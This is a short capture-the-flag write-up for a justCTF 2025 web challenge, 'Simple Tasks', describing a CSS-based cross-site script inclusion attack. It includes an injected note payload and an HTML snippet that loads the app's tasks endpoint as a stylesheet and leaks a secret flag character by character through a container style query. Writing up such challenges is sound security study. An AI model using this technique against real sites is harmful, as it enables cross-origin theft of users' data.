# justctf-2025_private~3

# Simple Tasks

TL;DR CSS-based XSSI.

Steps:
1. Add a note with content `{}*{--x:` so that first letter of the flag will be stored in a local variable.
2. Leak the first char via previewing the following file:

```html
<link rel=stylesheet href=http://localhost:3000/tasks>
<style>@container style(--x:,
j...<rest of HTML>)
{
  body{
    background: red;
  }
}
</style>
```

3. Repeat the process for next characters